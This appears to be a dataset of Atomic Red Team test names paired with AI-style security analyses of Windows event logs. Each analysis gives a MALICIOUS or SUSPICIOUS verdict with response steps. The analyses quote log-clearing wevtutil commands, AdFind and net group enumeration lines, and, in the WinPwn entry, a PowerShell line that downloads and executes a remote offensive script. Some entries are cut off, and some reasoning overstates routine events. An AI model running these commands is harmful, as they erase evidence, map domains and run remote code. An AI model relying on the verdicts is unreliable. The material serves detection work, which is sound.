Adfind - Enumerate Active Directory Trusts,"Upon analyzing the provided Windows event logs, several activities indicate suspicious behavior. Here is a detailed breakdown of the analysis:

### Suspicious and Anomalous Behaviors:
1. **Process Executions:**
   - `powershell.exe` and `conhost.exe` activities initiated by the user `SERVER002\\admin_test` are common vectors for executing potentially harmful scripts or commands. While PowerShell usage is common, it might require scrutiny to ensure no unusual commands are executed without authorization.
   
2. **Use of Wevtutil:**
   - The `wevtutil.exe` process was repeatedly run with the `cl` (clear) parameter. Specifically, logs indicate this command was used to clear multiple event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, `Windows PowerShell`) which is abnormal for standard operations and indicative of an attempt to cover malicious tracks.

3. **External Tools:**
   - A command line involving an external payload, `AdFind.exe`, was executed. This tool can be used to enumerate Active Directory data and is often utilized in reconnaissance phases by attackers. The context: `cmd.exe /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\AdFind.exe"" -gcb -sc trustdmp` suggests a potentially malicious activity, used for gathering information about trust relationships within the network.

4. **Event Log Clearing:**
   - Multiple entries show event logs (`System`, `Windows PowerShell`) being cleared by the non-system user `admin_test` at the same time (`2024-10-26 18:47:16.6100459`), which is very concerning and further suggests attempts to erase evidence of suspicious or unauthorized activities.

5. **Security Logs:**
   - The event log files being cleared is further confirmed by an event entry showing that they were cleared by `admin_test` with the corresponding user SID. This is highly suspicious since normal operations rarely require manual log clearance without creating a backup or rationale.

### Indication of Potential Compromise:
- The combination of PowerShell usage, history of external tool execution, and the action taken to clear event logs strongly suggests that the logs contain traces of malicious activity.

### Assessment:
- Based on the presence of indicators such as suspicious command usage, external enumeration tools, and clearing of event logs, it is evident that these activities are not benign and point towards potential malicious intent.

### Resolution:
- **MALICIOUS:** The logs indicate activities consistent with potential unauthorized access, malicious reconnaissance, and attempts to obfuscate actions.

### Guidance:
1. **Immediate Actions:**
   - Isolate the affected system (`Server002`) to prevent further potential malicious activity and lateral movement within the network.
   - Begin a full forensic investigation to understand the extent of the compromise and identify the entry point.
   - Review any recent changes made by the user `admin_test` and ensure their actions correspond to known and authorized administrative reviews.

2. **Long-term Measures:**
   - Implement stricter log monitoring and alerting for critical operations like log clearing and process executions with suspicious parameters.
   - Conduct a thorough audit of user privileges to ensure that roles and permissions are properly assigned and least privilege principles are followed.
   - Engage in user awareness training to help employees recognize and report suspicious activities promptly.

Ensure these actions and any derived conclusions from further investigations are documented for compliance and possible future reference."
Remote System Discovery - nltest,"Upon reviewing the provided event logs, several points of interest hint at potentially malicious activity:

1. **Log Clearing Events:**
   - **Security Log Clearance (Event ID 1102)**: The security event logs were cleared by user `admin_test`, as indicated by the event at `2024-10-21 09:22:27`. Log clearance, especially of security logs, is a major red flag. It can signify an attempt to cover tracks after performing unauthorized or suspicious actions.

2. **Sysmon Event Analysis:**
   - Multiple instances of `wevtutil.exe` usage (event IDs 17926, 17930, 17938, etc.) indicate cleared logs (cl command), specifically targeting Application, System, and Security logs. This action is typically associated with malicious activity as attackers often clear logs to remove traces.
   - The `wsmprovhost.exe` process is involved as a parent for many `wevtutil.exe` processes, suggesting a scripted task or automated process running these commands.
   
3. **Other Anomalies:**
   - **Credential Read Attempts (Event ID 5379)**: A series of credential read attempts using `MicrosoftAccount:user=02txoixylodcstop` are marked with a `ReturnCode` of `3221226021`, indicating failures. While there’s no definitive proof of exploiting valid credentials here, this repeated attempt raises suspicion about potential credential stuffing or similar reconnaissance.
   - **High Integrity Process Executions**: Many processes executed with high integrity levels indicate potential privilege misuse. This is typical in environments where an attacker has gained elevated access.

4. **Privilege Use (Event ID 4672)**:
   - A SYSTEM level privilege event logs several high-level privileges (like `SeDebugPrivilege`). Misuse of such privileges could allow an attacker to exert extensive control over the system, allowing manipulation of services, and other potential malicious exploits.

### Assessment:
The logs present several indicators of compromise, notably the systematic clearing of logs, use of elevated privileges, and multiple process executions that coincide with suspicious credential access attempts. Collectively, these events draw a concerning picture pointing towards attempts of malicious activities deliberately obfuscating actions on the host.

### Resolution:
**MALICIOUS** - Based on the analysis, the activities logged appear to show signs indicative of malicious actions due to log clearance, elevated privilege misuse, and suspicious credential access attempts. Immediate action should be taken to investigate the host further. This includes isolating the system, conducting a thorough forensic analysis, reviewing the integrity of accounts, reverting potentially unauthorized changes, and assessing the wider network security posture."
GetCurrent User with PowerShell Script,"The event log analysis reveals the following key pieces of information:

1. **Event Log Clearing:**
   - Multiple instances where event logs were cleared (`EventID: 1102` in Security log and `EventID: 104` in System log) by the user `admin_test`. Clearing log files is often a tactic used by attackers to cover their tracks.

2. **Privilege Escalation:**
   - An account with the `SYSTEM` user was associated with a high level of privileges (`EventID: 4672`). This event itself is common for SYSTEM operations, however, combined with log tampering could indicate an elevation of privilege for malicious purposes.

3. **Attempts to Access Credentials:**
   - Several `EventID: 5379` events indicating attempts to access credentials with a return code of `3221226021`, which corresponds to an ""Access Denied"" message. While these events show failed attempts, they still can indicate potentially unauthorized attempts to access secure data.

4. **Suspicious Process Execution:**
   - `wevtutil.exe` was used multiple times with `cl` (clear) options: Security logs, System logs, and PowerShell logs were cleared. `wevtutil.exe` is commonly used to manage event logs but is unusual when used repeatedly in quick succession to clear logs, especially by an admin user not currently logged in interactively.

5. **PowerShell Use:**
   - PowerShell activities were seen through the `Windows PowerShell` log, invoking scripts to output user identity information to a file, which might not be immediately suspicious but is often used in reconnaissance by attackers.

Given these factors:

- The combination of log clearing, privilege escalation, failed access attempts, and PowerShell usage strongly indicates suspicious behavior.
- The evidence suggests potential tampering with logs to cover tracks of activities on the system.

**Resolution:** **SUSPICIOUS** - The actions seen within the logs suggest activities that should be examined further, particularly focusing on log file tampering, potential privilege abuse, and any unauthorized attempts to access credential information.

**Guidance:**
- Immediately secure the affected host for forensic analysis to preserve evidence.
- Review and enhance logging and monitoring to detect similar behavior in real-time.
- Conduct a thorough investigation into the `admin_test` account's activities to determine legitimacy or fraudulent usage.
- Investigate network activity from this host for potential data exfiltration or further attack vectors."
Adfind - Enumerate Active Directory Exchange AD Objects,"### Detailed Analysis of the Logs

#### Suspicious and Anomalous Behavior

1. **Event Log Clearing:**
   - **Security Log Clear (Event ID 1102):** At ""2024-10-23 21:11:46"", the security event log was cleared by the user ""admin_test"". Clearing event logs is often used by attackers to cover their tracks.
   - **System Log Clear (Event ID 104):** Similar actions to clear system logs were also recorded shortly after. This is typically suspicious behavior as it is not common in day-to-day administrative activities unless specifically required and documented.

2. **Command Execution and Tools:**
   - **Execution of `AdFind.exe`:** Detected via a CMD execution with the command `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\AdFind.exe"" -sc exchaddresses`. *AdFind.exe* is a tool used for active directory enumeration and is commonly seen in penetration testing and adversarial TTPs (Tactics, Techniques, and Procedures). 
   - **Use of `wevtutil.exe`:** Multiple executions of `wevtutil.exe` were logged specifically with 'cl' (clear) commands directed at clearing Windows event logs such as Security, System, and Application logs.

3. **Privilege Escalation Indications:**
   - **Event ID 4672:** Indicates special privileges were assigned to the SYSTEM user context multiple times. While this might not alone indicate malicious intent, when combined with log clearing and usage of known enumeration tools, it raises suspicion.
  
4. **Unusual Process Activity:**
   - **Non-standard Paths and Temporary Directories:** Several processes launched from unusual or temporary directories, particularly related to Microsoft Edge Updater processes. While frequent Microsoft Edge Update operations in quick succession are generally benign, when coupled with other anomalies, they warrant a closer look.

#### Potential Indicators of Compromise

- **Log Clearing Routine**: The logs reveal a deliberate attempt to clear Security and System event logs using the `wevtutil.exe` utility. This suggests malicious intent to hide system activity.
  
- **Execution of Reconnaissance Tools**: The invocation of `AdFind.exe`, often used in collecting information on active directory environments, suggests enumeration or preparation stages of a cyber attack.

### Assessment of the Situation

Given the combination of event log clearing, the execution of potential enumeration tools, and the context of these actions especially on a high-value target like a CEO machine, there are strong indicators of not just generic suspicious activity but potentially malicious activity. Log manipulation and use of `AdFind.exe` point towards potential unauthorized access and reconnaissance, likely at the beginning stages of a broader intrusion or data exfiltration attempt.

### Resolution: **MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Response:**
   - **Isolate the affected machine** to prevent further unauthorized access or lateral movement within the network.
   - Begin a **forensic disk imaging** of the affected machine to preserve evidence.

2. **Containment and Eradication:**
   - Review and change credentials, especially for accounts observed in suspicious activity.

Suspicious LAPS Attributes Query with Get-ADComputer all properties,"### Log Analysis

#### Sysmon Log:
- **Multiple instances** of `wevtutil.exe` were executed by the user `SERVER002\admin_test`. The command lines used indicate an attempt to clear event logs: 
  - `wevtutil cl Microsoft-Windows-Sysmon/Operational`
  - `wevtutil cl Application`
  - `wevtutil cl Security`
  - `wevtutil cl System`
  - This activity is suspicious as it can be a sign of someone trying to cover up illicit activities by clearing logs.

#### Windows PowerShell Log:
- PowerShell was used to execute a command, specifically:
  - `Get-ADComputer $env:computername -Properties *`
  - This command is typically used for retrieving Active Directory computer object information. Although potentially benign in isolation, the context matters.

#### System Log:
- Logs being cleared with the event ID 104 for the `System` and `Windows PowerShell` channels supports the annotation of the `wevtutil.exe` usage from the Sysmon logs. 
- There is evidence of time anomaly (`Event ID 1` and `Event ID 24`), possibly indicating a manual or programmatic alteration to system time, but further external logs are required to establish intent.

#### Security Log:
- The clearing of the `Security` event log is noted as well with `Event ID 1102`. This often indicates malicious intent as attackers clear event logs to eliminate evidence.

#### Application Log:
- Standard update activities for Microsoft Edge are noted here. These events seem in line with routine software update processes.

### Assessment

The logs indicate a series of activities primarily focusing on cleaning various Windows Event Logs using `wevtutil.exe`. This behavior is often associated with attempts to purge evidence of illicit activities on the system. The use of PowerShell to query Active Directory data is an additional red flag, especially if the intent or context for the command is not clear. The combination of these, including clearing the `Security` log, suggests a potential compromise or unauthorized activity.

### Resolution
Based on the presence of standard update activities and the suspicious activity around the clearing of logs using `wevtutil.exe` by `admin_test`, the final determination is:

**MALICIOUS**

### Guidance on How to Proceed
- **Immediate Isolation**: The host should be isolated from the network to prevent further potential data exfiltration or lateral movement.
- **Further Investigation**: Conduct a thorough investigation to determine if any unauthorized access or data breach occurred.
- **System Restore and Remediation**: Consider restoring the system to a state prior to the suspicious activities and implement stricter access controls and monitoring.

- **Raise Awareness**: Inform IT security teams to be vigilant of similar activities in the network and investigate any anomalies promptly."
Suspicious LAPS Attributes Query with adfind all properties,"Upon analyzing the provided Windows event logs from the CEO's machine, the following points are observed that are relevant to the investigation:

### Suspicious Activities Detected:

1. **Event Log Clearing:**
   - Three different channels have been cleared: System, Windows PowerShell, and Security. This is a common tactic used by attackers to hide their tracks and remove evidence of their actions. The clearing was done by `SERVER002\admin_test` using the `wevtutil.exe` tool.

2. **Usage of PowerShell with External Utilities:**
   - A PowerShell script was executed with `AdFind.exe`, a tool commonly used for Active Directory enumeration, found under a path indicating it could be related to offensive security tooling (AtomicRedTeam). The use of `AdFind.exe` in conjunction with PowerShell suggests an attempt to gather information about the domain environment or its systems, which is often associated with reconnaissance in a typical attack kill chain.

3. **High Integrity Level Process Execution:**
   - Processes like `conhost.exe`, and `wevtutil.exe` were executed with a high integrity level by the user `admin_test`. While these processes themselves might be legitimate, their sequence and usage pattern in this context, especially tied with log clearing, raise concerns.

4. **Time Synchronization Events:**
   - Time change events were logged, which can be benign but are often investigated in the context of tampering or coordination for other malicious activities, especially in combination with other suspicious activities.

### Assessment of the Situation:

The logs suggest a coordinated attempt to carry out activities that align with potential intrusion tactics:
- **Log Clearing** is a clear indicator of efforts to conceal activities.
- **Reconnaissance Activities** using PowerShell and a known enumeration tool (`AdFind.exe`).
- Execution of tasks using high-privilege accounts.

Given the combination of these events, there is a considerable risk of malicious activity or attempted compromise.

### Resolution:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Isolate the affected system (Server002) from the network to prevent further unauthorized access or data exfiltration.

2. **Detailed Forensic Investigation:**
   - Analyze the system's disk for additional artifacts or malware that may have facilitated these actions.
   - Check for any unauthorized accounts or access rights modifications.

3. **Audit and Review:**
   - Audit all accounts, especially privileged ones, to check for unauthorized access or configuration changes.
   - Review PowerShell logs, if available in another location or backup, for further details on commands executed.

4. **Strengthen Security Posture:**
   - Implement more stringent logging and monitoring, especially for sensitive and high-privilege accounts.
   - Educate users, especially those with privileged access, on identifying phishing and social engineering attempts that could result in credential theft.

5. **Incident Response and Communication:**
   - Inform relevant stakeholders about the incident.
   - Continue to monitor other systems for similar activities, indicating a broader attack scope.

Taking these actions will help in mitigating the current threat and prevent similar incidents in the future."
Enumerate Active Directory for Unconstrained Delegation,"Upon analyzing the provided Windows event logs, several indicators suggest potentially suspicious and potentially malicious activities. Below is a detailed analysis:

### Suspicious or Anomalous Behavior
1. **PowerShell Execution:**
   - A PowerShell script was executed with the command: `{Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain}`. This command queries Active Directory for objects with a specific user account control flag, which could indicate an attempt to enumerate accounts with a specific control setting. While not inherently malicious, this command can be used in reconnaissance activities by adversaries.

2. **Sysmon Log Entries Related to `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` were executed with commands to clear event logs such as `Sysmon`, `Application`, `System`, `Security`, and `Windows PowerShell`.
   - Clearing event logs is a known tactic to cover tracks and is generally considered suspicious, especially when performed on sensitive systems such as those belonging to executive roles.

3. **Cleared Event Logs:**
   - The system log shows that the logs for `System`, `Windows PowerShell`, and `Security` channels have been cleared by the user `SERVER002\\admin_test`. This event is captured by Event ID 104 in the System and Security logs.
   - Particularly, Event ID 1102 in the Security log confirms this clearing activity.

4. **Registry and Environment Changes Monitored in PowerShell:**
   - Numerous PowerShell logs indicating changes to registry, environment, alias, and variable states, which could point to scripting activities. Combined with the timing and other suspicious activities, this adds to the overall suspicious context.

5. **Execution of `whoami.exe` and `hostname.exe`, TaskHost Processes:**
   - While these processes on their own are not malicious, frequent and unexplained executions can be indicative of system reconnaissance.

### Potential Malicious Activity
Given that the activities include Active Directory enumeration, multiple log clearings, and these actions are performed on a system described as the CEO's machine, there is a very high likelihood of compromise.

### Threats or Risks Identified
- **Lateral Movement Risk:**
  - The enumeration of Active Directory coupled with potential credential theft poses a risk of lateral movement within the network.
- **Privilege Escalation and Persistence:**
  - The use of high-integrity level processes and potentially modified registries or environments may suggest attempts at maintaining persistence.
- **Data Exfiltration and Loss:**
  - Enumerating user accounts in the domain could be a precursor to exfiltrating data or other sensitive activities.

### Guidance & Resolution
- Immediate investigation is recommended to confirm whether the commands and log clearing were legitimate administrative tasks or unauthorized activities.
- Review and tightly control privileged account activities and investigate the source of the AD querying scripts.
- Ensure that the CEO's machine is isolated for forensic investigation to prevent potential data exfiltration or further spread of compromise.

### Final Resolution
- **MALICIOUS:** The logs contain evidence of potential malicious activity, likely unauthorized access, and actions consistent with techniques to evade detection or perform unauthorized operations.

It is imperative to initiate a comprehensive incident response protocol to ascertain the scope and scale of the potential breach and secure other critical assets."
Discover System Language by Windows API Query,"After thoroughly analyzing the provided Windows event logs, the following suspicious or potentially malicious activities have been identified:

1. **Event Log Clearing Activity**:
   - The logs show multiple entries of event logs being cleared (EventID 104 in System and EventID 1102 in Security), specifically by the user `admin_test`. The `wevtutil` tool is used in the `Sysmon` logs (EventID 1), which indicates that the `admin_test` account executed command lines to clear the event logs. This activity is suspicious because clearing event logs can indicate an attempt to cover up malicious actions.

2. **Use of `wevtutil` Utility**:
   - Multiple `wevtutil` process executions are noted with command lines (`""C:\\Windows\\system32\\wevtutil.exe"" cl System`, `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`, and `""C:\\Windows\\system32\\wevtutil.exe"" cl ""Windows PowerShell""`) to clear logs. This further confirms the log clearing activities, which is often part of attack tactics to evade detection.

3. **Execution of Suspicious File**:
   - A suspicious execution of `LanguageKeyboardLayout.exe` is noted under the `Sysmon` logs (EventID 1), linked with the `cmd.exe` process. The file path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe` is indicative of execution of a program from a temporary directory, which might be used to run malicious payloads.

4. **Execution from Temporary Directory**:
   - The execution of processes from `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\` is suspicious, as these directories are often used by attackers to host their payloads. The presence of `AtomicRedTeam` suggests potential usage of attack simulation tools.

5. **Presence of High Privileges**:
   - There are multiple logon events (EventID 4672) granting high privileges to SYSTEM, which is a normal activity; however, in conjunction with other suspicious activity, it should be revisited to ensure credentials and privileges have not been misused.

**Assessment and Recommendation**:
The identified activities—clearing of event logs, execution of potentially malicious software from temporary directories, and suspicious process executions—strongly suggest attempts to hide or obfuscate unauthorized activity on the system. The actions taken by the `admin_test` account are consistent with common tactics used in cyber attacks to maintain persistence and evade detection.

**Resolution**: MALICIOUS

**Guidance**:
1. **Immediate Incident Response**: Engage your incident response team to isolate the affected system to prevent potential spread or data exfiltration.
2. **Account Review**: Investigate the `admin_test` account for unauthorized access or potential compromise. Consider resetting credentials and reviewing account usage.
3. **Forensic Analysis**: Perform a detailed forensic analysis of the system to identify any further malicious behaviors or indicators of compromise (IOCs).
4. **Log Retention**: Implement tighter controls for log retention to ensure logs cannot be easily cleared or tampered with.
5. **Security Monitoring**: Enhance monitoring of critical systems and users with elevated privileges to detect similar activities in the future."
Detect a Debugger Presence in the Machine,"Upon reviewing the provided Windows event logs, I've identified some events that suggest suspicious activity that warrants further investigation:

### Suspicious Activities Identified:

1. **Log File Clearing Events**:
    - **System Log Clearing**: Event ID 104 (System log) indicates that the log file was cleared by the user ""admin_test"" on `Server002` using `wevtutil.exe`. The clearing of event logs can be an indicator of attempts to hide malicious activities.
    - **Security Log Clearing**: Event ID 1102 (Security log) also indicates that the security log file was cleared by ""admin_test"" using `wevtutil.exe`.

2. **Unusual Time Change Events**:
   - The timestamps around `2024-10-28 16:50:58.9555219` and `2024-10-28 16:50:58.9568695` show that the system time was reverted. Time changes can be indicative of attempts to confuse timestamps for malicious activity or to align with a specific timeline for attacks.

3. **PowerShell Execution**:
   - Multiple instances of PowerShell starting with events suggesting the use of PowerShell to check for debugging processes and flags. This could potentially indicate an attempt to evade security or debugging tools.

4. **Privilege Escalation Indications**:
    - Event ID 4672 (Security log) shows the `admin_test` user account is granted several sensitive privileges including `SeDebugPrivilege`, `SeSecurityPrivilege`, etc., which are generally not necessary unless for administrative tasks or malicious purposes.

### Sysmon Logs:
- Repeated use of `wevtutil.exe` by the `admin_test` user to clear event logs (`Sysmon` logs confirm use).
- The use of `conhost.exe` with command-line arguments like `0xffffffff -ForceV1` under the admin context could suggest attempts to spawn processes under concealment.

Given the combination of:
- Event logs being cleared.
- Time being manipulated.
- System commands executed that are often associated with system probing or persistence (like `wevtutil.exe` and PowerShell for debugging checks).
- Administration-level privileges being invoked.

These findings suggest the likelihood of potentially malicious activity. However, additional context or evidence might be needed to fully validate the scope or intention behind these actions.

### Recommendation:
- **Resolution:** SUSPICIOUS
- **Action Items**: 
  - Conduct a thorough investigation into the ""admin_test"" account activities and the origin of the commands used.
  - Review system integrity and consider changes to access privileges, especially if `wevtutil.exe` was used in a manner inconsistent with normal operations.
  - Check network traffic and additional systems for signs of lateral movement or similar behaviors.
  - Enable more comprehensive monitoring on sensitive accounts and operations and run additional security scans for potential threats or vulnerabilities.

This preliminary analysis suggests possible malicious intent but requires further investigation to ascertain full implications and preventive measures."
User Discovery With Env Vars PowerShell Script,"### Analysis of Windows Event Logs:

1. **Event Log Clearance:**
   - **Security Log - Event ID 1102:** The security log shows an event where logs were cleared by the user `admin_test`, as indicated by `EventRecordID` 30327.
   - **System Log - Event ID 104:** The system and Windows PowerShell logs were also cleared by the same user, `admin_test`.

   Clearing of event logs is typically associated with attempts to erase evidence of malicious activity. This action is highly suspicious as it obscures visibility into other events that may indicate a compromise.

2. **Failed Attempts to Access Credentials:**
   - **Security Log - Event ID 5379:** There are multiple failed attempts to access credentials (ReturnCode 3221226021), targeting `MicrosoftAccount:user=02txoixylodcstop`. These attempts involve the `SERVER002$` domain account, which is the local system account.
   - This indicates a possible unauthorized attempt at credential dumping or accessing information related to Microsoft Accounts.

3. **Processes and PowerShell Activity:**
   - **Sysmon Logs - Process Creation Events:** Observed commands such as `whoami`, `hostname`, and frequent usage of the `wevtutil.exe` command to clear logs. These actions are executed by `admin_test`, which aligns with attempts to establish information about the system and potentially clear evidence.
   - **PowerShell Log - Event ID 600:** A PowerShell script captures the active user and writes it to a text file, which can be used for monitoring or further malicious purposes.

4. **Antivirus and System Updates:**
   - **Defender Updates:** Security intelligence updates for Microsoft Defender are reported. The state of Windows Defender is active, as per the Application Log.
   - Updates and antivirus status appear normal and benign in context.

### Assessment:

- **Suspicious Behavior:** The clearing of multiple log channels by an administrative account, together with the failed credential access attempts and PowerShell scripting activity targeting the user environment, raises significant suspicion of malicious intent or an ongoing investigation by a malicious actor to cover their tracks.

- **Credential Access Attempts:** Even though credential access attempts failed, they may indicate reconnaissance or an attempt to gain further access.

### Recommendation and Resolution:

- **Resolution:** **SUSPICIOUS** - The activities observed demand further investigation to confirm malicious intent or rule out false positives. Immediate actions should include:
  - Conduct a full forensic analysis of the host and network to trace back any unauthorized access.
  - Verify the validity of the `admin_test` user and whether it should have the permissions to clear logs.
  - Monitor similar actions across other systems for patterns or coordinated activities.
  - Strengthen monitoring to catch further unauthorized activities in real-time and mitigate them quickly.
  - Consider isolating the host and resetting credentials that might have been compromised directly or indirectly."
File and Directory Discovery (PowerShell),"Upon reviewing the provided logs, there are several elements of the activity on the host that raise concerns:

1. **Wevtutil.exe Usage:**
   - The logs show frequent execution of `wevtutil.exe` with the `cl` command (clear logs) targeting several critical event logs: ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"". Clearing of logs is a strong indicator of an attempt to cover tracks, which is commonly associated with malicious behavior.

2. **Windows PowerShell Execution:**
   - A PowerShell command is executed: `powershell.exe & {ls -recurse, get-childitem -recurse, gci -recurse}`. While the command itself executes safe PowerShell cmdlets (`ls`, `get-childitem`, `gci`) for directory listing with recursion, its execution timing, along with the clearing of PowerShell logs, is suspicious.

3. **Privilege and Integrity Level:**
   - The processes ran with high integrity levels, indicating they were executed with administrative privileges, which are necessary for clearing event logs. The user `SERVER002\admin_test` appears to have high-level access that was potentially misused.

4. **Frequent Use of `conhost.exe`:**
   - Frequent spawning of `conhost.exe` associated with `wevtutil.exe` and `PowerShell` is part of normal operation. However, the execution and timestamp correlation with the clearing activity necessitates scrutiny as it could be part of a broader PowerShell-based attack or post-exploitation technique.

5. **Log Clearing Events:**
   - The system and security logs contain EventID 104 and 1102 indicating log file clearing by the `admin_test` user. Such activities are highly unusual under standard circumstances and strongly point towards malicious intent.

6. **Time Manipulation:**
   - There are kernel events that show changes in system time, which may indicate attempts to manipulate timestamps, further complicating an investigation.

7. **Network Service and HostName Commands:**
   - While not indicative on their own, these elements' timing and frequency can suggest anomaly depending on normative baselines for this system's role. The `WHOAMI` and `HOSTNAME` command executions are typically indicative of environment discovery attempts, often done by intruders.

**Assessment:**
The logs display clear signs of potential malicious activity. The baleful use of `wevtutil.exe` to clear critical logs, combined with the PowerShell activity that followed, indicates an attempt to obfuscate actions or remove traces of potentially illicit behavior.

**Resolution:**
- **MALICIOUS**: Logs contain evident activity aligning with attempts to cover tracks post-compromise, likely indicative of unauthorized insider actions or external actor with administrative access.

**Guidance:**
1. Immediately isolate the host to prevent further compromise.
2. Conduct a deeper forensic analysis on file system changes and network connections.
3. Review and potentially reset credentials and access permissions for `admin_test`.
4. Consider utilizing endpoint detection and response (EDR) tools to monitor any further suspicious activities.
5. Ensure logging mechanisms are robust, with secure logging configurations that mitigate unauthorized clearing or tampering."
Elevated group enumeration using net group (Domain),"Based on the Windows event logs provided, a detailed analysis indicates the presence of potentially malicious activity. Here’s the breakdown:

### Suspicious/Anomalous Behavior
1. **Clearing of Logs**:
   - **Security log cleared**: EventID 1102 indicates that the Security logs were cleared by the user `admin_test`. This is highly suspicious as attackers typically clear logs to cover their tracks.
   - **System and Windows PowerShell logs cleared**: EventID 104 shows logs were cleared in the System and Windows PowerShell channels by the same user. Similar to the Security log clearance, this is a red flag indicating an attempt to hide activities.

2. **Unexpected Commands**:
   - **Multiple `net` commands** executed: The execution of a series of net commands (`net groups ""Account Operators""`, `net groups ""Exchange Organization Management""`, etc.) to query or manipulate group memberships is suspicious. It indicates possible reconnaissance or privilege escalation attempts.
   - The command line used with `cmd.exe` suggests a targeted attempt to gather information on privileged groups within the domain.

3. **Usage of Elevated Privileges**:
   - The log shows a logon session (EventID 4624) using NTLM and subsequently granted elevated privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.) as shown in EventID 4672. These privileges, especially when coupled with the log clearance actions, suggest potential malicious intent.

4. **Process Execution Patterns**:
   - The execution of `wevtutil.exe`, a command-line utility to manage event logs, indicates deliberate log management or tampering. 
   - The execution sequence of commands involving system utilities like `whoami.exe`, `conhost.exe`, and multiple instances of `net.exe` in a brief timeframe further supports the indication of manual manipulation or scripting by an unauthorized user.
   
### Assessment of Malicious Activity
The combination of cleared logs, execution of specific administrative commands, elevated privileges, and attempts to access domain group information strongly indicate potentially malicious behavior. Typical benign or routine operations do not include such a sequence, especially from an administrative context outside established protocols or maintenance windows.

### Threats/Risks Identified:
- Possible internal or external threat actor attempting privilege escalation and reconnaissance.
- Potential exposure of sensitive domain information and manipulation of user group memberships.
- High risk of subsequent actions post-reconnaissance that could lead to data exfiltration or further compromise.

### Recommendation:
1. **Immediate Actions**:
   - Isolate the affected host (`Server002`) from the network to prevent further unauthorized access.
   - Revoke the credentials of the `admin_test` user and investigate potential compromise of this account.
   - Conduct a forensic investigation to determine the full scope of the intrusion and identify any other affected systems.

WinPwn - GPORemoteAccessPolicy,"Upon reviewing the logs provided for the Windows host, several activities indicate potential malicious activity:

1. **PowerShell Execution with Suspicious Command:**
    - Multiple PowerShell execution logs show a command line that downloads and executes a script from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). This script repository is named suggestively, indicating it might be related to a penetration testing or malicious tool.
    - The usage of `iex(new-object net.webclient).downloadstring()` in PowerShell is typically indicative of attempts to execute remote scripts, which is a common tactic employed by attackers.

2. **Clearing of Windows Event Logs:**
    - The Security, System, and PowerShell event logs have been cleared (`EventID 1102` in Security logs; `EventID 104` in System logs; and usage of `wevtutil` in Sysmon logs).
    - This activity is often performed by attackers to cover their tracks and is a strong indicator of malicious intent.

3. **Time Manipulation:**
    - There are entries showing changes in system time (`EventID 4616` in Security logs and corresponding in System logs). Changing system time may be used to alter timestamps in logs or disrupt forensic analysis.

4. **Elevated Privileges:**
    - The user `admin_test` is found to have various high-level privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, etc.`) associated with their session. Elevated privileges may have been leveraged to execute administrator-level tasks.

5. **Usage of Administrative Tools for Log Manipulation:**
    - `wevtutil.exe` is used to clear event logs, as evidenced in the Sysmon logs. It indicates an intentional log clearing using administrative tools.

Given these observations, these activities are highly indicative of a security breach or unauthorized activity on the system. The logs contain clear signs of suspicious commands executed via PowerShell, efforts to erase traces by clearing logs, and potentially other privilege escalation techniques.

- Immediate containment measures should be advised, such as isolating the affected host from the network to prevent further malicious activity.
- A thorough investigation should be conducted to identify any further compromise within the network, focusing on other systems that might have interacted with the compromised host.
- It is recommended to perform a detailed forensic analysis on the compromised host, including memory and disk forensics, to gather detailed information about the tools and tactics used.
- Review access logs and privileged account usage to understand the scope of the compromise and identify any further affected accounts or machines.
- Consider updating security controls and conducting an organization-wide security audit to prevent future incidents."
Enumerate Active Directory Users with ADSISearcher,"Based on the analysis of the provided Windows event logs, there are several notable observations indicating potentially suspicious activity:

### Notable Findings:

1. **PowerShell Activity**:
    - Multiple PowerShell events are logged with the process `powershell.exe` and a command attempting to query user objects by running `Get-ADUser`. Such commands can be legitimate for administrative tasks, but in a sensitive environment like the CEO's machine, this action without a prior established baseline of legitimate administrative activity could be suspicious.
    - The use of `PowerShell.exe` with scripts involving Active Directory searches at precise intervals may indicate an automated task or script targeting user information.

2. **Event Log Clearing**:
    - The Windows event logs, including the Security, System, and PowerShell logs, show instances of being cleared by a user `admin_test`. Specifically, the command execution through `wevtutil.exe` suggests deliberate attempts to erase tracks. The clearing of logs can be a strong indicator of malicious activity aiming to hide unauthorized actions.

3. **Sysmon Logs and Event Clearing**:
    - Sysmon logs record the execution of `wevtutil.exe` commands for clearing various logs. This further reinforces the suspicion surrounding these actions, as log clearing is typically associated with post-exploitation behavior to cover up traces.

4. **Security Log Event**:
    - Event ID `1102` in the Security log indicates the security log has been cleared. This is highly suspicious as it indicates potential tampering with critical logs used for auditing security-related activities.

5. **Time Stamping**:
    - There are events in the System and Security logs showing time changes. While `4616` represents a change of system time, which could be due to synchronization with a time server, it requires correlation with other tasks or logs to ensure its legitimacy.

6. **User and Process Context**:
    - The clearing of logs and execution of PowerShell commands are associated with the `admin_test` user. This correlation suggests high integrity level processes carried out by a user with significant privileges, often a red flag for unauthorized administrative activity unless validated as part of an authorized maintenance protocol.

### Assessment:

Given the combination of high-integrity processes executing potentially sensitive commands, deliberate clearing of logs using Windows utilities, and timing of events, there's a reasonable cause for concern.

### Resolution:

**MALICIOUS** - The evidence of cleared logs, sensitive PowerShell activity querying user data, and potential concealment activities strongly suggests malicious intent. Immediate response actions are recommended, such as:
- Isolating the compromised system to limit further data exposure.
- Conduct a thorough forensic investigation.
- Review access logs and correlated network traffic for other unusual behavior.
- Notify relevant stakeholders and potentially law enforcement, depending on company protocol and jurisdictional laws regarding data breaches.

